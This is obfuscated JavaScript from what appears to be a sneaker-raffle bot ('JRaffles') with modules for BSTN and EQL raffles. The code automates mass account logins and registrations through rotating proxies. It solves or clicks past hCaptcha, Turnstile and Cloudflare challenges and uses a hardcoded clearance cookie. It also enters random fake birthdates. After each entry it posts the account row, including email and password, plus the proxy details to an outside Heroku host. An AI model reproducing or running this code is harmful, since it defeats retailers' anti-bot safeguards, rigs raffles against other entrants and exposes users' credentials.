                        if (_0x3a5c95 != 'yes')
                            var _0x3a5c95 = '', _0x1ad4d7 = 0x0;
                        _0x1e0e73(_0x461201['name'] + '\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20/\x20' + _0x39f5b6['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        var _0x53d4a3 = Math['round'](Math['random']() * (_0x3d3780['length'] - 0x1)), _0x2a56fe = _0x3d3780[_0x53d4a3]['split'](':'), _0x5aec24;
                        try {
                            _0x5aec24 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2a56fe[0x0] + ':' + _0x2a56fe[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x5aec24 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x2a56fe[0x0] + ':' + _0x2a56fe[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5a541d = await _0x5aec24['newPage'](), _0x3799f3 = await _0x5a541d['target']()['createCDPSession'](), { windowId: _0x318832 } = await _0x3799f3['send']('Browser.getWindowForTarget');
                            await _0x5a541d['setViewport']({
                                'width': 0x501,
                                'height': 0x2d0
                            });
                            var _0x3b53d6 = [{
                                'name': 'cf_clearance',
                                'value': 'uyuh7Wo9shR3zcpWvbWJ04mG0iNC2N25mhp1FNAbHYY-1676282182-0-1-9764d0ee.e7bea100.c0658f0e-160',
                                'domain': '.bstn.com',
                                'path': '/',
                                'expires': 1707818183.331533,
                                'httpOnly': !![],
                                'secure': !![]
                            }];
                            await _0x5a541d['authenticate']({
                                'username': '' + _0x2a56fe[0x2],
                                'password': '' + _0x2a56fe[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5a541d['goto']('' + _0x39f5b6[_0x5e32eb]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Solving\x20Cloudflare');
                            var _0x716cbe = await _0x5a541d['$']('.hcaptcha-box');
                            if (_0x716cbe) {
                                console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x4d70b1(0x2710);
                                const _0x31c4b4 = await _0x5a541d['$']('.hcaptcha-box');
                                if (_0x31c4b4)
                                    try {
                                        await _0x31c4b4['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x5a541d['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x85aee1 = await _0x5a541d['$']('.hcaptcha-box');
                                    if (_0x85aee1)
                                        try {
                                            await _0x85aee1['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            try {
                                await _0x5a541d['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L');
                            } catch {
                                throw new Error('Blocked\x20by\x20Cloudflare');
                            }
                            await _0x3799f3['send']('Browser.setWindowBounds', {
                                'windowId': _0x318832,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x4d70b1(0x1388), await _0x5a541d['waitForSelector']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5a541d['focus']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4d70b1(0x1f4), console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Logging\x20in'), await _0x5a541d['$eval']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb', _0x1c6d7e => _0x1c6d7e['click']()), await _0x5a541d['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x5a541d['click']('.nonLoggedSpecific_nonLogged__SCu0L\x20>\x20.Button_secondary__XJln1.Button_button__Bq8yb'), await _0x4d70b1(0x7d0), await _0x5a541d['waitForSelector']('#email-login'), await _0x5a541d['type']('#email-login', '' + _0x39f5b6[_0x5e32eb]['Email']), await _0x4d70b1(0xdac), await _0x5a541d['waitForSelector']('#password'), await _0x5a541d['type']('#password', '' + _0x39f5b6[_0x5e32eb]['Password'], { 'delay': 0xe6 }), await _0x4d70b1(0x157c);
                            try {
                                await _0x5a541d['$eval']('.login_accountInfo__FCIxY\x20>\x20button[type=\x22submit\x22]', _0x4c6ba8 => _0x4c6ba8['click']());
                            } catch {
                            }
                            try {
                                await _0x5a541d['waitForSelector']('.swatchOptions_sizeTiles__Lizc2');
                            } catch (_0x40bde0) {
                            }
                            await _0x4d70b1(0x3e8);
                            const _0x108bd1 = await _0x5a541d['$']('.enteredDraw_container__2KmQ_');
                            if (_0x108bd1)
                                throw new Error('Duplicate\x20Entry');
                            console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x39f5b6[_0x5e32eb]['Size']);
                            try {
                                if (_0x39f5b6[_0x5e32eb]['Size'] != 'RANDOM') {
                                    var _0x3012f8 = _0x39f5b6[_0x5e32eb]['Size']['replace']('.', ',');
                                    const _0x606a5e = await _0x5a541d['$x']('//div[contains(text(),\x20' + _0x3012f8 + ')]');
                                    await _0x606a5e[0x0]['click']();
                                } else {
                                    const _0x1c5a12 = await _0x5a541d['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1554be = Math['round'](Math['random']() * (_0x1c5a12['length'] - 0x1));
                                    await _0x1c5a12[_0x1554be]['click']();
                                }
                            } catch {
                                throw new Error('Softblocked,\x20Rotating\x20proxy');
                            }
                            await _0x4d70b1(0x1f4);
                            const _0x4db5da = await _0x5a541d['$']('.addressList_addressItem__LE2PB');
                            if (_0x4db5da && _0x39f5b6[_0x5e32eb]['Mode'] != 'NEW') {
                            } else
                                console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Filling\x20Address'), await _0x5a541d['click']('div.product_shipping__zEfqd\x20>\x20div\x20>\x20div.legend_legend__sQIiF\x20>\x20div.legend_header__iHZIh\x20>\x20div\x20>\x20button'), await _0x4d70b1(0x5dc), await _0x5a541d['waitForSelector']('#firstname'), await _0x5a541d['type']('#firstname', '' + _0x39f5b6[_0x5e32eb]['FirstName']), await _0x4d70b1(0x1f4), await _0x5a541d['waitForSelector']('#firstname'), await _0x5a541d['type']('#lastname', '' + _0x39f5b6[_0x5e32eb]['LastName']), await _0x4d70b1(0x1f4), await _0x5a541d['waitForSelector']('#firstname'), await _0x5a541d['type']('#street', '' + _0x39f5b6[_0x5e32eb]['Address1']), await _0x4d70b1(0x1f4), await _0x5a541d['waitForSelector']('#firstname'), await _0x5a541d['type']('#houseNumber', _0x39f5b6[_0x5e32eb]['HouseNumber'] + '\x20' + _0x39f5b6[_0x5e32eb]['Address2']), await _0x4d70b1(0x1f4), await _0x5a541d['waitForSelector']('#firstname'), await _0x5a541d['select']('#country_code', '' + _0x39f5b6[_0x5e32eb]['Country']), await _0x4d70b1(0x1f4), await _0x5a541d['type']('#postcode', '' + _0x39f5b6[_0x5e32eb]['Zip']), await _0x4d70b1(0x1f4), await _0x5a541d['type']('#city', '' + _0x39f5b6[_0x5e32eb]['City']), await _0x4d70b1(0x1f4), await _0x5a541d['type']('#telephone', '' + _0x39f5b6[_0x5e32eb]['Phone']), await _0x4d70b1(0x1f4), await _0x5a541d['click']('.addressModal_submit__dOiL4\x20>\x20button[type=\x22submit\x22]');
                            await _0x4d70b1(0x9c4);
                            try {
                                await _0x5a541d['type']('#instagram_name', '' + _0x39f5b6[_0x5e32eb]['Follower']), await _0x5a541d['click']('.note_groupBtn__WLDwH\x20>\x20button');
                            } catch {
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x4d70b1(0x5dc);
                            try {
                                await _0x5a541d['click']('.checkBox_boxHolder__wLGVe');
                            } catch {
                            }
                            await _0x4d70b1(0x5dc), await _0x5a541d['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x11e6a3 => _0x11e6a3['click']()), await _0x4d70b1(0x1388);
                            try {
                                await _0x5a541d['waitForSelector']('.success_msg__2HjJY');
                            } catch {
                                await _0x5a541d['reload']({ 'waitUntil': 'networkidle2' });
                                if (_0x39f5b6[_0x5e32eb]['Size'] != 'RANDOM') {
                                    var _0x3012f8 = _0x39f5b6[_0x5e32eb]['Size']['replace']('.', ',');
                                    const _0x119c61 = await _0x5a541d['$x']('//div[contains(text(),\x20' + _0x3012f8 + ')]');
                                    await _0x119c61[0x0]['click']();
                                } else {
                                    const _0x4d59e6 = await _0x5a541d['$$']('div.swatchTile_tile__IRH9Q');
                                    var _0x1554be = Math['round'](Math['random']() * (_0x4d59e6['length'] - 0x1));
                                    await _0x4d59e6[_0x1554be]['click']();
                                }
                                await _0x4d70b1(0x5dc);
                                try {
                                    await _0x5a541d['hover']('#instagram_name'), await _0x5a541d['type']('#instagram_name', '' + _0x39f5b6[_0x5e32eb]['Follower']), await _0x5a541d['click']('.note_groupBtn__WLDwH\x20>\x20button');
                                } catch {
                                }
                                console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ad4d7 + '\x20/\x205)');
                                try {
                                    await _0x5a541d['hover']('.checkBox_boxHolder__wLGVe'), await _0x4d70b1(0x5dc), await _0x5a541d['click']('.checkBox_boxHolder__wLGVe');
                                } catch {
                                }
                                await _0x4d70b1(0x157c), await _0x5a541d['$eval']('.termConditions_TC__hll9k\x20>\x20button', _0x25ed12 => _0x25ed12['click']()), await _0x4d70b1(0x1388), await _0x5a541d['waitForSelector']('.success_msg__2HjJY');
                            }
                            _0x3a5c95 = 'no', _0x5155d2(_0x39f5b6[_0x5e32eb], _0x461201);
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'entrydata': JSON['stringify'](_0x4748d9),
                                    'proxy': '' + _0x3d3780[_0x5e32eb]
                                };
                                var _0x31ee69 = JSON['stringify'](prxdata);
                                let _0x288d98 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x31ee69, _0x288d98);
                            } catch (_0xa7a2ea) {
                            }
                            console['log'](_0x46bace['green'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            var _0x143d79 = await _0x39e876(_0x39f5b6[_0x5e32eb], _0x461201, 'dev', ![]), _0x543e17 = await _0x39e876(_0x39f5b6[_0x5e32eb], _0x461201, 'pub', ![]);
                            const _0x2b1986 = {
                                'succesDEVMSG': { 'embeds': [_0x143d79] },
                                'succesPUBMSG': { 'embeds': [_0x543e17] }
                            };
                            let _0x4748d9 = _0x39f5b6[_0x5e32eb];
                            try {
                                prxdata = {
                                    'username': _0x5e8391['replace']('#', ''),
                                    'module': _0x461201['name'],
                                    'entrydata': JSON['stringify'](_0x4748d9),
                                    'proxy': '' + _0x3d3780[_0x5e32eb]
                                };
                                var _0x31ee69 = JSON['stringify'](prxdata);
                                let _0xf15951 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x582cfc['post']('https://jraffles.herokuapp.com/success', _0x31ee69, _0xf15951);
                            } catch (_0x3eef8d) {
                            }
                            try {
                                _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x2b1986['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x53da78, _0x2b1986['succesDEVMSG']), await _0x4d70b1(0xc8), await _0x19fe15(_0x44bee6, _0x2b1986['succesPUBMSG']);
                            } catch (_0x43e64a) {
                                console['log'](_0x46bace['yellow'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x43e64a));
                            }
                        } catch (_0x74b72b) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20' + _0x74b72b)), _0x3a5c95 = 'yes', _0x5ba01a = '' + _0x74b72b;
                            var _0x4c9246 = await _0x39e876(_0x39f5b6[_0x5e32eb], _0x461201, 'dev', !![], _0x5ba01a), _0x143d79 = await _0x39e876(_0x39f5b6[_0x5e32eb], _0x461201, 'dev', ![]), _0x543e17 = await _0x39e876(_0x39f5b6[_0x5e32eb], _0x461201, 'pub', ![]);
                            const _0x13c6fc = {
                                'succesDEVMSG': { 'embeds': [_0x143d79] },
                                'succesPUBMSG': { 'embeds': [_0x543e17] }
                            };
                            _0x13c6fc['errorDEV'] = { 'embeds': [_0x4c9246] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0x13c6fc['errorDEV']), await _0x19fe15(_0x556085, _0x13c6fc['errorDEV']);
                        } finally {
                            _0x5aec24['close']();
                            if (_0x3a5c95 == 'yes' && _0x1ad4d7 != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Task\x20' + (_0x5e32eb + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ad4d7 + '\x20/\x205)')), _0x5e32eb = _0x5e32eb - 0x1, _0x1ad4d7 = _0x1ad4d7 + 0x1;
                                continue;
                            }
                            _0x3a5c95 == 'yes' && _0x1ad4d7 >= 0x5 && (_0x5415a4(_0x39f5b6[_0x5e32eb], _0x461201), _0x3a5c95 = 'no', _0x1ad4d7 = 0x0), console['log'](_0x446ef5() + '\x20[' + _0x461201['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            },
            {
                'name': 'BSTN\x20Win\x20Checker',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x5bd4d3, _0x67346f) {
                    _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x35ea91['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    var _0x29392f;
                    try {
                        const _0x22831e = _0xf25b74['readFileSync']('../accounts/bstn.csv', 'utf-8');
                        _0x29392f = _0x20e9d9['parse'](_0x22831e, { 'header': !![] })['data'];
                    } catch (_0x2dd9fd) {
                        throw new Error('Error\x20reading\x20accounts/bstn.csv');
                    }
                    for (var _0xf0b485 = 0x0; _0xf0b485 < _0x29392f['length']; _0xf0b485++) {
                        if (_0x217127 != 'yes')
                            var _0x217127 = '', _0x539c0e = 0x0;
                        var _0x30a799;
                        _0x1e0e73(_0x5bd4d3['name'] + '\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20/\x20' + _0x29392f['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                        var _0x214975 = await _0x39e876(_0x29392f[_0xf0b485], _0x5bd4d3, 'acc', ![]);
                        const _0xa80d6e = { 'succesDEVMSG': { 'embeds': [_0x214975] } }, _0x2a13dd = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x4dc61c = Math['round'](Math['random']() * (_0x67346f['length'] - 0x1)), _0x5dbd33 = _0x67346f[_0x4dc61c]['split'](':'), _0x1d6cb2;
                        try {
                            _0x1d6cb2 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5dbd33[0x0] + ':' + _0x5dbd33[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1d6cb2 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5dbd33[0x0] + ':' + _0x5dbd33[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4831d2 = await _0x1d6cb2['newPage']();
                            await _0x4831d2['authenticate']({
                                'username': '' + _0x5dbd33[0x2],
                                'password': '' + _0x5dbd33[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4831d2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x4831d2['setRequestInterception'](!![]), _0x4831d2['on']('request', _0x308411 => {
                                _0x308411['resourceType']() === 'image' ? _0x308411['abort']() : _0x308411['continue']();
                            });
                            try {
                                await _0x4831d2['goto']('https://www.bstn.com/eu_en/raffle/customer/', { 'waitUntil': 'networkidle2' }), await _0x4831d2['waitForSelector']('button[class=\x22cf2Lf6\x22]');
                            } catch {
                                _0x217127 = 'yes';
                                throw new Error('Connection\x20Error');
                            }
                            await _0x4831d2['click']('button[class=\x22cf2Lf6\x22]'), console['log'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20Passing\x20Cloudflare'), await _0x4d70b1(0x3e8), await _0x4831d2['type']('#email', _0x29392f[_0xf0b485]['Email']), await _0x4d70b1(0x1f4), await _0x4831d2['type']('#pass', _0x29392f[_0xf0b485]['Password']), await _0x4d70b1(0x1f4), await _0x4831d2['$eval']('#login-form', _0x2f477a => _0x2f477a['submit']());
                            try {
                                await _0x4831d2['waitForSelector']('.product-items');
                            } catch {
                                console['log'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20No\x20Entries\x20Found');
                                continue;
                            }
                            await _0x4d70b1(0x190);
                            const _0x48c045 = await _0x4831d2['evaluate'](() => {
                                const _0xa908e2 = Array['from'](document['querySelectorAll']('.product-item-photo\x20>\x20img'));
                                return _0xa908e2['map'](_0x40fae6 => _0x40fae6['alt']);
                            }), _0x1913e3 = await _0x4831d2['evaluate'](() => {
                                const _0x2edd5f = Array['from'](document['querySelectorAll']('.tooltip.wrapper.product-item-tooltip.first-xs'));
                                return _0x2edd5f['map'](_0x44a7c2 => _0x44a7c2['innerHTML']);
                            }), _0x530776 = await _0x4831d2['$$']('.raffle-winner');
                            if (_0x530776['length'] < 0x1) {
                                console['log'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20No\x20Wins\x20Found'), _0x217127 = 'no';
                                continue;
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20' + _0x530776['length'] + '\x20Wins\x20Found!');
                            for (var _0x100019 = 0x0; _0x100019 < _0x530776['length']; _0x100019++) {
                                console['log'](_0x46bace['green'](_0x48c045[_0x100019] + _0x1913e3[_0x100019]['replace']('\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20', '')));
                            }
                        } catch (_0x38275c) {
                            console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20' + _0x38275c)), _0x30a799 = '' + _0x38275c;
                            var _0x151705 = await _0x39e876(_0x29392f[_0xf0b485], _0x5bd4d3, 'acc', !![], _0x30a799);
                            _0xa80d6e['errorDEV'] = { 'embeds': [_0x151705] }, _0x35ea91['webhook'] != undefined && _0x35ea91['webhook'] != '' && await _0x19fe15(_0x35ea91['webhook'], _0xa80d6e['errorDEV']), await _0x19fe15(_0x556085, _0xa80d6e['errorDEV']), _0x217127 = 'yes';
                        } finally {
                            if (_0x1d6cb2)
                                _0x1d6cb2['close']();
                            if (_0x217127 == 'yes' && _0x539c0e != 0x5) {
                                console['log'](_0x46bace['red'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Task\x20' + (_0xf0b485 + 0x1) + '\x20:\x20Retrying\x20(' + _0x539c0e + '\x20/\x205)')), _0xf0b485 = _0xf0b485 - 0x1, _0x539c0e = _0x539c0e + 0x1;
                                continue;
                            }
                            _0x217127 == 'yes' && _0x539c0e >= 0x5 && (_0x5415a4(_0x29392f[_0xf0b485], _0x5bd4d3), _0x217127 = 'no', _0x539c0e = 0x0), console['log'](_0x446ef5() + '\x20[' + _0x5bd4d3['name'] + ']\x20Waiting\x20for\x20' + _0x35ea91['delay'] + '\x20ms'), await _0x4d70b1(_0x35ea91['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'EQL',
        'modules': [{
            'name': 'EQL\x20Raffle\x20Entries',
            'store': 'EQL',
            'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,h_170,w_170,f_auto,b_white,q_auto:eco,dpr_1/qfc09zbor8py2zfmsdr2',
            'function': async function (_0x2824d7, _0xc4feca, _0x42183f) {
                _0x4ada75['use'](_0x120ab9()), _0x4ada75['use'](_0x2d400b({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x35ea91['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x30717b = 0x0; _0x30717b < _0xc4feca['length']; _0x30717b++) {
                    var _0x1173b8;
                    _0x1e0e73(_0x2824d7['name'] + '\x20Task\x20' + (_0x30717b + 0x1) + '\x20/\x20' + _0xc4feca['length'] + '\x20||\x20File:\x20' + _0x18b452 + '\x20Proxies:\x20' + _0x324cb1);
                    try {
                        await _0x408b94(_0xc4feca, _0x30717b);
                    } catch {
                        _0x21541b = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x2d133a(_0x1bc29a) {
                        const _0x2af102 = _0xf25b74['readFileSync']('../successful-tasks.csv', 'utf8'), _0x770208 = _0x20e9d9['parse'](_0x2af102, { 'header': !![] })['data'];
                        let _0x2cce02 = ![];
                        for (var _0x339595 of _0x770208) {
                            if (_0x339595['Url'] == _0x1bc29a['Url'] && _0x339595['Email'] == _0x1bc29a['Email']) {
                                _0x2cce02 = !![];
                                break;
                            }
                        }
                        return _0x2cce02;
                    }
                    if (await _0x2d133a(_0xc4feca[_0x30717b]) == !![]) {
                        console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x189ad1 = ![];
                    const _0x526caa = _0xf25b74['readFileSync']('../accounts/eql.csv', 'utf8');
                    var _0x25ea28 = _0x20e9d9['parse'](_0x526caa, { 'header': !![] })['data'];
                    for (var _0x4f2923 of _0x25ea28) {
                        _0x4f2923['Email'] == _0xc4feca[_0x30717b]['Email'] && (_0x189ad1 = !![]);
                    }
                    if (_0x189ad1 == ![]) {
                        var _0x387ab4;
                        if (_0xc4feca[_0x30717b]['Url']['endsWith']('/')) {
                            _0x387ab4 = _0xc4feca[_0x30717b]['Url'] + 'register';
                            if (_0x21541b != 'yes')
                                var _0x21541b = '', _0x2afcdc = 0x0;
                        } else {
                            _0x387ab4 = _0xc4feca[_0x30717b]['Url'] + '/register';
                            if (_0x21541b != 'yes')
                                var _0x21541b = '', _0x2afcdc = 0x0;
                        }
                        if (_0xc4feca[_0x30717b]['Email'] == '' || _0xc4feca[_0x30717b]['FirstName'] == '' || _0xc4feca[_0x30717b]['LastName'] == '') {
                            console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0xc4feca[_0x30717b]['Password'] == '' && (_0xc4feca[_0x30717b]['Password'] = 'JRaffles23!');
                        if (_0x35ea91['useRandomProxy'] = ![])
                            var _0x209416 = _0x42183f[_0x30717b]['split'](':');
                        else
                            var _0xf32e05 = Math['round'](Math['random']() * (_0x42183f['length'] - 0x1)), _0x209416 = _0x42183f[_0xf32e05]['split'](':');
                        var _0x26fae0;
                        try {
                            _0x26fae0 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x209416[0x0] + ':' + _0x209416[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26fae0 = await _0x4ada75['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x209416[0x0] + ':' + _0x209416[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5f4463 = await _0x26fae0['newPage']();
                            await _0x5f4463['authenticate']({
                                'username': '' + _0x209416[0x2],
                                'password': '' + _0x209416[0x3]
                            }), console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5f4463['setRequestInterception'](!![]), _0x5f4463['on']('request', _0x2110e8 => {
                                _0x2110e8['resourceType']() === 'image' || _0x2110e8['resourceType']() === 'font' || _0x2110e8['resourceType']() === 'media' ? _0x2110e8['abort']() : _0x2110e8['continue']();
                            });
                            try {
                                await _0x5f4463['goto']('' + _0x387ab4);
                            } catch {
                                throw new Error('Connection\x20Error');
                            }
                            console['log'](_0x446ef5() + '\x20[' + _0x2824d7['name'] + ']\x20Task\x20' + (_0x30717b + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x4d70b1(0x3e8), await _0x5f4463['waitForSelector']('#email'), await _0x5f4463['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x4d70b1(0x3e8);
                            try {
                                await _0x5f4463['click']('li[data-value=\x22EU\x20' + _0xc4feca[_0x30717b]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20' + _0xc4feca[_0x30717b]['Size']);
                            }
                            await _0x4d70b1(0x6a4), await _0x5f4463['type']('#email', '' + _0xc4feca[_0x30717b]['Email']), await _0x4d70b1(0x352), await _0x5f4463['waitForSelector']('#password'), await _0x5f4463['type']('#password', '' + _0xc4feca[_0x30717b]['Password']), await _0x4d70b1(0x352), await _0x5f4463['type']('#phone', '' + _0xc4feca[_0x30717b]['Phone']), await _0x4d70b1(0x352);
                            const _0x3de5c8 = await _0x5f4463['$']('#title\x20>\x20label');
                            await _0x4d70b1(0x12c);
                            _0x3de5c8 && await _0x3de5c8['click']();
                            await _0x5f4463['type']('#firstName', '' + _0xc4feca[_0x30717b]['FirstName']), await _0x4d70b1(0x352), await _0x5f4463['type']('#lastName', '' + _0xc4feca[_0x30717b]['LastName']), await _0x4d70b1(0x352);
                            _0xc4feca[_0x30717b]['Url']['includes']('footlocker.de') ? await _0x5f4463['type']('#birthdate', _0x54fb61(0xa, 0x1c) + '.' + _0x54fb61(0xa, 0xc) + '.' + _0x54fb61(0x7c6, 0x7d3)) : await _0x5f4463['type']('#birthdate', _0x54fb61(0xa, 0x1c) + '-' + _0x54fb61(0xa, 0xc) + '-' + _0x54fb61(0x7c6, 0x7d3));
                            await _0x4d70b1(0x352), await _0x5f4463['click']('.MuiBox-root.css-79elbk\x20>\x20button');
                            try {
                                await _0x5f4463['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0x4d70b1(0x1f4), await _0x4d70b1(0x5dc);
                            if (!_0x387ab4['includes']('footlocker'))
                                try {
                                    await _0x5f4463['click']('#country');
                                    const _0x3a3d20 = await _0x5f4463['$']('li[data-value=\x22' + _0xc4feca[_0x30717b]['Country'] + '\x22]');
                                    await _0x3a3d20['click'](), await _0x3a3d20['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
